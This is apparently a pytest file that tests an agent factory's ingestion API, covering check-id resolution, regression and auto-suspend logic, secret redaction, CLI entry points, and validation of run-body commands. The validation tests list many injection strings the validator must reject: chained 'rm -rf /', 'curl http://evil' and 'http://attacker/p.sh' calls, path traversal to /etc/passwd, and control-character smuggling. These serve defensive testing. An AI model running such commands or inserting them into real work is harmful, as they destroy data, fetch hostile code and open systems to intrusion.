"""The ingestion API's seam defects: the check_id contract, the reconciled regress path, the
auto-suspend evidence sense, resurrection binding, run-body execution safety, lesson redaction, and
the missing CLI entry points.

Every test here fails against a "return True" body: each one pins a concrete value the running
system depends on (an identifier a lifecycle verb can actually resolve, an argv vector rather than
a shell string, a binding that makes a resurrected check apply, a redacted lesson body, a
subcommand that reaches the real API function).
"""

from __future__ import annotations

import subprocess
import types
from pathlib import Path
from typing import Any

import pytest
from hooks import _praxis

from agent_factory import failure_taxonomy as ft
from agent_factory import ingestion_api
from conftest import FakeCheckStore


@pytest.fixture
def store(check_store: FakeCheckStore, monkeypatch: pytest.MonkeyPatch) -> FakeCheckStore:
    """``check_store`` plus the ticket-side primitives ``regress_for_check`` needs."""
    tickets: dict[str, dict[str, Any]] = {}

    def get_fact(cid: str, **kw: Any) -> dict[str, Any]:
        return tickets.get(cid, {"id": cid, "meta": {}})

    def regress_requirements(project: str, ids: list[str], *, detail=None, **kw: Any):
        for tid in ids:
            tickets.setdefault(tid, {"id": tid, "meta": {}})["meta"].update((detail or {}).get(tid, {}))
        return {"count": len(ids)}

    def write_build_state(cid: str, patch: dict[str, Any], **kw: Any):
        tickets.setdefault(cid, {"id": cid, "meta": {}})["meta"].update(patch)
        return {}

    monkeypatch.setattr(_praxis, "get_fact", get_fact)
    monkeypatch.setattr(_praxis, "regress_requirements", regress_requirements)
    monkeypatch.setattr(_praxis, "write_build_state", write_build_state)
    monkeypatch.setattr(_praxis, "record_episode", lambda *a, **kw: {})
    check_store.tickets = tickets  # type: ignore[attr-defined]
    return check_store


# --------------------------------------------------------------------------- D1: the check_id contract

def test_ingest_returns_an_id_every_lifecycle_verb_can_actually_resolve(store: FakeCheckStore) -> None:
    """The whole defect in one assertion: whatever ``ingest`` hands back must be accepted by the
    verbs, because a caller has nothing else to pass them. Returning the Praxis FACT id made every
    verb raise ValueError and stranded the check in report_only forever."""
    result = ingestion_api.ingest("a machine draft", "proj",
                                  drafted_run="pytest tests/test_x.py -q", channel="machine")

    check_id = result["check_id"]
    stored = store.check(check_id)
    assert stored["id"] != check_id, "the fake must not seed storage id == authored id"

    # Each verb resolves through _fetch_check(meta.check_id) -- none of these may raise.
    ingestion_api.upgrade_on_first_pass(check_id, "proj", True)
    assert store.check(check_id)["meta"][ingestion_api.M_ENFORCEMENT_STATE] == ingestion_api.STATE_GATING
    ingestion_api.widen(check_id, "proj", ["t-9"])
    assert "t-9" in store.check(check_id)["meta"]["applies_to"]
    ingestion_api.suspend(check_id, "proj", "operator says so")
    assert store.check(check_id)["meta"][ingestion_api.M_ENFORCEMENT_STATE] == ingestion_api.STATE_SUSPENDED


def test_the_regress_entry_recorded_on_a_ticket_names_the_resolvable_id(store: FakeCheckStore) -> None:
    """The id stamped onto the ticket's finding is the one a later ``regress_by_check`` will look
    the check up by -- a fact id there breaks the streak accounting AND the lookup."""
    result = ingestion_api.ingest("a machine draft", "proj", drafted_run="pytest -q",
                                  channel="machine", ticket_ids=["t1"], commit_sha="sha-a")
    entries = store.tickets["t1"]["meta"]["regression_detail"]  # type: ignore[attr-defined]
    assert [e["check_id"] for e in entries] == [result["check_id"]]
    ingestion_api._fetch_check(entries[0]["check_id"], "proj")  # must not raise


# --------------------------------------------------------------------------- D2: one regress path

def test_ingest_regression_path_bumps_cycles_revokes_leases_and_can_auto_suspend(
    store: FakeCheckStore,
) -> None:
    """``ingest`` used the cycle/lease path, ``regress_by_check`` used the auto-suspend path, and
    neither carried the other's guarantee. One path now carries all three."""
    result = ingestion_api.ingest("a machine draft", "proj", drafted_run="pytest -q",
                                  channel="machine", ticket_ids=["t1"], commit_sha="sha-a")
    check_id = result["check_id"]
    meta = store.tickets["t1"]["meta"]  # type: ignore[attr-defined]
    assert meta["regress_cycles"] == {check_id: 1}, "ingest's path must bump the cycle count"

    # Two more no-relevant-change regressions at the SAME commit through the other entry point.
    out = None
    for _ in range(2):
        out = ingestion_api.regress_by_check("proj", "t1", check_id, "still failing",
                                             commit_sha="sha-a")
    assert out["auto_suspend"]["status"] == "suspended", (
        "regress_by_check must still auto-suspend after the reconciliation")
    assert store.tickets["t1"]["meta"]["regress_cycles"] == {check_id: 3}, (  # type: ignore[attr-defined]
        "regress_by_check must now bump the cycle count too -- otherwise the cap can never trip")
    assert store.check(check_id)["meta"][ingestion_api.M_ENFORCEMENT_STATE] == (
        ingestion_api.STATE_SUSPENDED)


def test_regress_by_check_revokes_a_live_lease(store: FakeCheckStore) -> None:
    """D5/E2 — the guarantee ``regress_by_check`` used to drop entirely: a ticket regressed out from
    under a live worker lease must carry the revocation marker so the holder's FINISH is refused."""
    import time as _time

    from hooks import _ticket_state as ts

    now = _time.time()
    store.tickets["t1"] = {"id": "t1", "meta": {  # type: ignore[attr-defined]
        ts.M_BUILD_STATE: "in_progress", ts.M_CLAIM_OWNER: "worker-a",
        ts.M_CLAIM_AT: now, ts.M_CLAIM_HEARTBEAT_AT: now, ts.M_CLAIM_LEASE_TTL: 900,
    }}
    ingestion_api.regress_by_check("proj", "t1", "chk-live", "regressed under lease",
                                   commit_sha="sha-a")
    meta = store.tickets["t1"]["meta"]  # type: ignore[attr-defined]
    assert meta.get(ts.M_REGRESSED_OWNER) == "worker-a", meta


# --------------------------------------------------------------------------- D3: auto-suspend evidence

def test_a_correct_check_with_no_recorded_shas_is_never_auto_suspended(store: FakeCheckStore) -> None:
    """The end-to-end D3 case, through the entry point the shell writers actually use: neither
    entry point supplies a commit_sha, so an evidence-free streak must never suspend."""
    result = ingestion_api.ingest("a machine draft", "proj", drafted_run="pytest -q",
                                  channel="machine", ticket_ids=["t1"])
    check_id = result["check_id"]
    for _ in range(ingestion_api.DEFAULT_AUTO_SUSPEND_THRESHOLD + 2):
        out = ingestion_api.regress_by_check("proj", "t1", check_id, "caught another defect")
        assert out["auto_suspend"]["status"] == "observed"
        assert out["auto_suspend"]["streak"] == 0
    assert store.check(check_id)["meta"][ingestion_api.M_ENFORCEMENT_STATE] != (
        ingestion_api.STATE_SUSPENDED)
    assert not [f for f in store.facts.values()
                if f["category"] == "lesson" and f["meta"].get("auto_suspended")], (
        "no lesson may assert a healthy check is a false positive")


# --------------------------------------------------------------------------- D4: resurrection binds

def _arm_resurrection(monkeypatch: pytest.MonkeyPatch, store: FakeCheckStore) -> None:
    monkeypatch.setattr(ft, "is_armed", lambda: True)
    monkeypatch.setattr(ft, "find_matching_class",
                        lambda text, classes=None, **kw: {"id": "cls-1", "text": "pool exhausted"})


def test_a_resurrected_check_is_bound_to_the_tickets_it_is_regressing(
    store: FakeCheckStore, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Without the binding, ingest regresses tickets against a check whose applies_to never names
    them: the ticket reruns, pins nothing, passes, recurs, and eventually parks blocked citing a
    check that never applied."""
    _arm_resurrection(monkeypatch, store)
    store.seed_check("c-old", {"failure_class_id": "cls-1", "run": "pytest tests/test_pool.py",
                               "applies_to": ["t-original"], "surfaces": [],
                               "proof_status": "proven",
                               ingestion_api.M_ENFORCEMENT_STATE: ingestion_api.STATE_ARCHIVED})

    result = ingestion_api.ingest("pool exhausted again", "proj",
                                  drafted_run="pytest tests/test_pool_v2.py", channel="machine",
                                  ticket_ids=["t-new"], surfaces=["s-checkout"])

    assert result["resurrected"] is True
    assert result["check_id"] == "c-old"
    meta = store.check("c-old")["meta"]
    assert meta["applies_to"] == ["t-new", "t-original"], "the new binding is a UNION, not a replace"
    assert meta["surfaces"] == ["s-checkout"]
    assert meta[ingestion_api.M_ENFORCEMENT_STATE] == ingestion_api.STATE_GATING
    assert meta["run"] == "pytest tests/test_pool.py", "prior proof history stays untouched"


def test_resurrection_without_new_tickets_leaves_the_prior_binding_alone(
    store: FakeCheckStore, monkeypatch: pytest.MonkeyPatch,
) -> None:
    _arm_resurrection(monkeypatch, store)
    store.seed_check("c-old", {"failure_class_id": "cls-1", "applies_to": ["t-original"],
                               "surfaces": [],
                               ingestion_api.M_ENFORCEMENT_STATE: ingestion_api.STATE_SUSPENDED})
    ingestion_api.ingest("pool exhausted again", "proj", drafted_run="pytest -q", channel="machine")
    assert store.check("c-old")["meta"]["applies_to"] == ["t-original"]
    assert "rebound_at" not in store.check("c-old")["meta"]


# --------------------------------------------------------------------------- D5/D6: run-body safety

_BYPASSES = [
    "pytest -q\nrm -rf /tmp/x",                                # newline is a command separator
    "pytest -q & curl http://evil/x",                          # bare & backgrounds a second command
    "python -m timeit __import__('os').system('curl http://evil')",  # no metacharacter needed
    "grep -R x ../../../etc/passwd",                           # no path containment
    "pytest -q; rm -rf /",
    "pytest -q && curl http://evil",
    "pytest -q | tee /tmp/x",
    "pytest -q `curl http://evil`",
    "pytest -q $(curl http://evil)",
    "pytest -q > /etc/passwd",
    "pytest --rootdir=../../../etc -q",
    "pytest -q\trm -rf /tmp/x",
    # D1 round 2 -- containment used to be "does the TOKEN start with '/'", so every one of these
    # absolute paths rode in on the VALUE side of a --flag=value token and was accepted.
    "pytest --rootdir=/etc",
    "pytest --basetemp=/etc/x",
    "python -m pytest --rootdir=/",
    "grep -R x --include=/etc/*",
    "pytest --rootdir=~/.ssh",
    "pytest --rootdir=a/../../etc",
    # D2 round 2 -- C1 control characters (NEL, CSI) are line-breaking and category Cc, but the
    # old check only covered ord(ch) < 0x20 and 0x7F.
    "pytest -q\x85id",
    "pytest -q\x9bid",
    "pytest -q\u2028id",
]


@pytest.mark.parametrize("body", _BYPASSES)
@pytest.mark.parametrize("channel", ["machine", "human"])
def test_every_known_allowlist_bypass_is_refused_on_both_channels(body: str, channel: str) -> None:
    """D5 + D6 — the prefix allowlist accepted all of these, and the ``human`` channel skipped
    validation entirely even though ``af_learn`` hardcodes ``channel="human"`` for a command the
    AGENT drafted from a user's free-text complaint."""
    with pytest.raises(ingestion_api.RunBodyRejected):
        ingestion_api._validate_run_body(body, channel=channel)


@pytest.mark.parametrize("body", [
    "pytest -q",
    "pytest tests/test_x.py -q",
    "python -m pytest tests/test_x.py",
    "npm test",
    "npx playwright test",
    "ruff check .",
])
def test_legitimate_machine_bodies_still_validate(body: str) -> None:
    assert ingestion_api._validate_run_body(body, channel="machine") == body


def test_the_human_channel_has_no_verb_exemption(monkeypatch: pytest.MonkeyPatch) -> None:
    """D6 round 2 -- ``channel="human"`` says which ENTRY POINT a body arrived through, never that
    a human read it: ``af_learn`` hardcodes it for a body the AGENT drafted. The verb allowlist
    therefore applies on both channels, and the only way past it is the explicit waiver."""
    for channel in ("human", "machine"):
        with pytest.raises(ingestion_api.RunBodyRejected):
            ingestion_api._validate_run_body("curl -sf http://internal/healthz", channel=channel)
    assert ingestion_api._validate_run_body("curl -sf http://internal/healthz", channel="human",
                                            human_verbatim=True)


def test_the_verbatim_waiver_still_enforces_shape_and_containment() -> None:
    """The waiver covers the VERB allowlist only -- "there is no shell" is not negotiable."""
    for body in ("curl -sf http://internal/healthz --output ../../../etc/passwd",
                 "curl -sf http://internal/healthz --output /etc/passwd",
                 "curl -sf http://internal/healthz\nrm -rf /tmp/x",
                 "curl -sf http://internal/healthz; rm -rf /"):
        with pytest.raises(ingestion_api.RunBodyRejected):
            ingestion_api._validate_run_body(body, channel="human", human_verbatim=True)


def test_af_learn_cannot_reach_the_verbatim_waiver() -> None:
    """The waiver must be one the DRAFTING agent cannot set: ``af_learn.learn`` — the human-channel
    entry point an agent drives from free-text prose — exposes no parameter that reaches it."""
    import inspect

    from agent_factory import af_learn

    for fn in (af_learn.learn, af_learn.learn_bulk):
        assert "human_verbatim" not in inspect.signature(fn).parameters

    # Assert the PROPERTY (nothing reaches ingest), not the absence of a substring. The earlier
    # version scanned af_learn's source for the name, which could not tell "passes it through" from
    # "explicitly refuses it" -- and went red the moment the bulk back door was closed by a guard
    # that has to name the thing it rejects.
    seen: list[dict] = []

    def _spy(text, project, **kwargs):
        seen.append(kwargs)
        return {"lesson_id": "l1", "check_id": "c1", "proof_status": "unproven"}

    monkeypatch = pytest.MonkeyPatch()
    try:
        monkeypatch.setattr(af_learn.ingestion_api, "ingest", _spy)
        monkeypatch.setattr(af_learn, "resolve_target_project", lambda *a, **k: "proj-x")
        af_learn.learn("a complaint", project="proj-x", drafted_run="pytest -q")
        af_learn.learn_bulk([{"complaint_text": "a complaint", "drafted_run": "pytest -q"}],
                            project="proj-x")
    finally:
        monkeypatch.undo()

    assert seen, "the spy never saw an ingest call — the test proved nothing"
    for kwargs in seen:
        assert "human_verbatim" not in kwargs, (
            "af_learn must not be able to pass the verb-allowlist waiver through to ingest")


def test_the_verbatim_waiver_is_recorded_on_the_check_it_waives(
    store: FakeCheckStore, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A waived check is never silent: it carries ``verb_allowlist_waived`` and writes an episode."""
    episodes: list[str] = []
    monkeypatch.setattr(_praxis, "record_episode",
                        lambda text, **kw: episodes.append(text) or {})
    result = ingestion_api.ingest("a human typed this one", "proj",
                                  drafted_run="curl -sf http://internal/healthz",
                                  channel="human", human_verbatim=True)
    assert store.check(result["check_id"])["meta"]["verb_allowlist_waived"] is True
    assert any("WAIVED" in text for text in episodes), episodes


def test_ingest_without_the_waiver_refuses_an_off_allowlist_human_body(store: FakeCheckStore) -> None:
    """The end-to-end D6 case: the exact call ``af_learn.learn`` makes, refused before any write."""
    with pytest.raises(ingestion_api.RunBodyRejected):
        ingestion_api.ingest("a lesson", "proj", drafted_run="curl -sf http://internal/healthz",
                             channel="human")
    assert store.facts == {}


def test_a_rejected_body_leaves_nothing_behind(store: FakeCheckStore) -> None:
    """Validation runs BEFORE any write -- a smuggled body must not land a lesson either."""
    with pytest.raises(ingestion_api.RunBodyRejected):
        ingestion_api.ingest("a smuggled draft", "proj",
                             drafted_run="pytest -q\nrm -rf /tmp/x", channel="machine")
    assert store.facts == {}


def test_a_validated_body_executes_as_argv_never_through_a_shell(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The other half of D5: validation is meaningless if the body then reaches ``shell=True``,
    where the shell -- not this module -- decides what the string means."""
    seen: dict[str, Any] = {}

    def fake_run(cmd: Any, **kw: Any) -> Any:
        seen["cmd"], seen["kw"] = cmd, kw
        return types.SimpleNamespace(returncode=0)

    monkeypatch.setattr(subprocess, "run", fake_run)
    body = "pytest tests/test_x.py -q"
    check = {"meta": {"run": body, "run_hash": ingestion_api._hash_text(body)}}

    assert ingestion_api.execute_check(check) is True
    assert seen["cmd"] == ["pytest", "tests/test_x.py", "-q"]
    assert seen["kw"].get("shell") is not True


def test_the_executor_re_validates_so_a_smuggled_stored_body_still_cannot_run(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Defense in depth: a check whose stored body somehow bypassed insertion-time validation
    (hand-edited fact, older schema) is refused at execution rather than handed to a shell."""
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: pytest.fail("a smuggled body reached subprocess"))
    body = "pytest -q; curl http://evil"
    check = {"meta": {"run": body, "run_hash": ingestion_api._hash_text(body)}}
    with pytest.raises(ingestion_api.RunBodyRejected):
        ingestion_api.execute_check(check)


# --------------------------------------------------------------------------- D7: lesson redaction

def test_the_lesson_body_and_the_ticket_finding_are_both_redacted(store: FakeCheckStore) -> None:
    """``lesson_text`` becomes the org-shared lesson body, the check criterion and the ticket's
    finding text -- ``redact_secrets`` never ran on any of them."""
    secret = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345"
    bodies: list[str] = []
    original_request = _praxis._request

    def recording_request(method: str, path: str, *, body=None, **kw: Any):
        if method == "POST" and path == "/insights":
            bodies.append(str((body or {}).get("insight") or ""))
        return original_request(method, path, body=body, **kw)

    _praxis._request = recording_request  # type: ignore[assignment]
    try:
        ingestion_api.ingest(f"the build leaked token={secret} into the log", "proj",
                             drafted_run="pytest -q", channel="machine", ticket_ids=["t1"])
    finally:
        _praxis._request = original_request  # type: ignore[assignment]

    assert bodies, "nothing was written at all"
    for text in bodies:
        assert secret not in text, f"an unredacted secret reached a written fact: {text!r}"
    assert any("[REDACTED]" in text for text in bodies)

    finding = store.tickets["t1"]["meta"]["regression_detail"][0]  # type: ignore[attr-defined]
    assert secret not in finding["reason"]


def test_the_repro_bundle_stays_deliberately_unredacted(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """FL4's reproduction guarantee must survive D7: only the diff/evidence PROSE is scanned.

    Asserted through the running code path, not through ``inspect.getsource``. A source-text
    assertion mixes a code object's import-time ``co_firstlineno`` with whatever the file says on
    disk NOW, so any later edit that shifts lines makes ``getsource`` hand back a different
    function's body and the test fails for a reason that has nothing to do with redaction.
    """
    secret = "sk-LIVE1234567890ABCDEFGHIJKLMNOPQ"
    repo = tmp_path / "origin"
    repo.mkdir()
    for args in (("init", "-q"), ("config", "user.email", "a@b.com"),
                 ("config", "user.name", "test")):
        subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)
    (repo / "settings.py").write_text(f'API_KEY = "{secret}"\n')
    subprocess.run(["git", "-C", str(repo), "add", "settings.py"], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(repo), "commit", "-q", "-m", "bad"], check=True,
                   capture_output=True)
    sha = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], check=True,
                         capture_output=True, text=True).stdout.strip()

    written: dict[str, Any] = {}
    monkeypatch.setattr(_praxis, "ensure_space", lambda *a, **kw: a[0])
    monkeypatch.setattr(_praxis, "_request",
                        lambda method, path, *, body=None, **kw: written.update(body=body)
                        or {"id": "artifact-1"})

    # Every value the redactor is handed, so the test can name what was scanned AND what was not.
    scanned: list[Any] = []
    real_redact = ingestion_api.redact_secrets

    def spy(value: Any) -> Any:
        scanned.append(value)
        return real_redact(value)

    monkeypatch.setattr(ingestion_api, "redact_secrets", spy)

    diff_text = f'+API_KEY = "{secret}"'
    evidence_text = f"boot failed with API_KEY={secret}"
    ingestion_api.pin_artifact(project="p", ticket_id="t", commit_sha=sha, repo_path=repo,
                               diff_text=diff_text, evidence_text=evidence_text)
    meta = written["body"]["meta"]

    # The PROSE is scanned...
    assert secret not in meta["diff"]
    assert "[REDACTED]" in meta["diff"]
    assert secret not in meta["evidence"]

    # ...and the BUNDLE is not handed to the redactor at all. Asserting on the STORED bundle cannot
    # see this: a git bundle is compressed, so a blanket redaction pass over it is a no-op that
    # silently still reproduces. What must hold is that the diff/evidence PROSE is the only thing
    # scanned -- so pin the exact set of scanned values.
    assert scanned == [diff_text, evidence_text], (
        f"only the diff/evidence prose may be scanned, but the redactor saw: {scanned!r}")

    # And the pinned bundle still re-materializes the byte-exact failing tree, secret and all.
    clone = ingestion_api.materialize_bundle(ingestion_api.decode_bundle(meta),
                                             tmp_path / "clean-machine")
    assert (clone / "settings.py").read_text() == f'API_KEY = "{secret}"\n'


# --------------------------------------------------------------------------- D8/D9: CLI entry points

def _dispatch(monkeypatch: pytest.MonkeyPatch, name: str, argv: list[str]) -> dict[str, Any]:
    """Run ``main(argv)`` and capture the call it made into the API function ``name``."""
    seen: dict[str, Any] = {}

    def spy(*args: Any, **kwargs: Any) -> dict[str, Any]:
        seen["args"], seen["kwargs"] = args, kwargs
        return {"id": "fact-1", "action": "added"}

    monkeypatch.setattr(ingestion_api, name, spy)
    assert ingestion_api.main(argv) == 0
    assert seen, f"the subcommand never reached {name}"
    return seen


def test_rollback_wave_has_a_cli_entry_point(monkeypatch: pytest.MonkeyPatch) -> None:
    """D8 -- ``rollback_wave`` was reachable only from a Python import nothing performs."""
    seen = _dispatch(monkeypatch, "rollback_wave", ["rollback-wave", "wave-7", "--project", "proj"])
    assert seen["args"] == ("wave-7", "proj")


def test_plan_time_author_check_has_a_cli_entry_point(monkeypatch: pytest.MonkeyPatch) -> None:
    """D9 -- the intake skills were deleted and every instruction points at this function, which
    nothing could invoke: the factory had lost the ability to author a build check."""
    seen = _dispatch(monkeypatch, "plan_time_author_check", [
        "author-check", "every page renders", "--project", "proj",
        "--applies-to", "auth, ui", "--run", "pytest -q", "--surfaces", "s-login",
    ])
    assert seen["args"] == ("every page renders", "proj")
    assert seen["kwargs"]["applies_to"] == ["auth", "ui"]
    assert seen["kwargs"]["surfaces"] == ["s-login"]
    assert seen["kwargs"]["run"] == "pytest -q"
    assert seen["kwargs"]["rubric"] is None


def test_author_check_accepts_a_graded_rubric(monkeypatch: pytest.MonkeyPatch) -> None:
    seen = _dispatch(monkeypatch, "plan_time_author_check", [
        "author-check", "reads well", "--project", "proj",
        "--rubric", '{"criteria": [], "pass_threshold": 0.8}',
    ])
    assert seen["kwargs"]["rubric"] == {"criteria": [], "pass_threshold": 0.8}


def test_plan_time_author_lens_has_a_cli_entry_point(monkeypatch: pytest.MonkeyPatch) -> None:
    seen = _dispatch(monkeypatch, "plan_time_author_lens", [
        "author-lens", "every destructive action needs an undo", "--project", "proj",
    ])
    assert seen["args"] == ("every destructive action needs an undo", "proj")
    assert seen["kwargs"]["applies_to"] is None


def test_an_unregistered_subcommand_still_exits_nonzero() -> None:
    """The counterpart to the three tests above: argparse is what makes them real, so a name that
    is NOT registered must still fail rather than silently no-op."""
    with pytest.raises(SystemExit):
        ingestion_api.main(["author-nothing", "t", "--project", "p"])


# ------------------------------------------------------- D4: the org-wide promotion write is anchored

def _promotion_capture(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    """Authenticate and capture what ``promote_universal`` would write org-wide."""
    monkeypatch.setattr(ingestion_api, "_require_authenticated", lambda identity=None: "tester")
    monkeypatch.setattr(ingestion_api, "read_promoted_universals", list)
    monkeypatch.setattr(_praxis, "ensure_space", lambda *a, **kw: a[0] if a else None)
    written: list[dict[str, Any]] = []
    monkeypatch.setattr(ingestion_api, "_write_insight",
                        lambda text, category, **kw: written.append(
                            {"text": text, "category": category, **kw}) or {"id": "insight-1"})
    return written


@pytest.mark.parametrize("body", [
    "curl -s http://evil/x",              # off-allowlist verb
    "pytest -q; rm -rf /",                # shell metacharacter
    "pytest --rootdir=/etc",              # absolute path on the value side
    "pytest -q\nrm -rf /tmp/x",           # control character
])
def test_promotion_refuses_an_unvalidated_run_body(
    body: str, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """This snapshot is org-wide and GATING on every non-exempt ticket in every project — the
    widest-blast-radius write in the system skipped run-body validation entirely."""
    written = _promotion_capture(monkeypatch)
    with pytest.raises(ingestion_api.RunBodyRejected):
        ingestion_api.promote_universal("a universal criterion", body,
                                        recurring_projects=["project-a", "project-b"])
    assert written == [], "a refused promotion must leave nothing in the org-wide snapshot"


def test_promotion_hash_pins_the_body_it_writes(monkeypatch: pytest.MonkeyPatch) -> None:
    """KD8 anchor 1 applies here too: without a ``run_hash`` the org-wide check is unpinnable and
    ``verify_pin`` would refuse to execute it (or, worse, nothing would notice it drifted)."""
    written = _promotion_capture(monkeypatch)
    ingestion_api.promote_universal("a universal criterion", "pytest tests/test_x.py -q",
                                    recurring_projects=["project-a", "project-b"])
    meta = written[0]["meta"]
    assert meta["run"] == "pytest tests/test_x.py -q"
    assert meta["run_hash"] == ingestion_api._hash_text("pytest tests/test_x.py -q")
    ingestion_api.verify_pin({"meta": meta})  # must not raise


# --------------------------------------------------------------------------- round-3 seam fixes


@pytest.mark.parametrize("channel", ["machine", "human"])
@pytest.mark.parametrize("body", [
    "pytest -o cache_dir=/etc/x",              # key=value one token RIGHT of the flag
    "python -m pytest -o cache_dir=~/evil",
    "pytest tests -o junit_family=x cache_dir=/etc/y",
    "make VAR=/etc",
])
def test_key_equals_value_containment_does_not_require_a_leading_dash(body, channel):
    """The first containment fix only split `=` on tokens starting with '-', so a bare
    `key=/abs/path` one token to the right of the flag was accepted on both channels."""
    with pytest.raises(ingestion_api.RunBodyRejected):
        ingestion_api._validate_run_body(body, channel=channel)


def test_bulk_entries_cannot_self_grant_the_verb_allowlist_waiver():
    """af_learn drafts run bodies from prose, so `learn` exposes no way to reach human_verbatim.
    Bulk mode splatted its entries into ingest, which made one extra dict key the back door."""
    from agent_factory import af_learn

    with pytest.raises(ValueError, match="human_verbatim"):
        af_learn.learn_bulk(
            [{"complaint_text": "flaky", "drafted_run": "curl -sSf http://attacker/p.sh",
              "human_verbatim": True}],
            project="victimproj",
        )
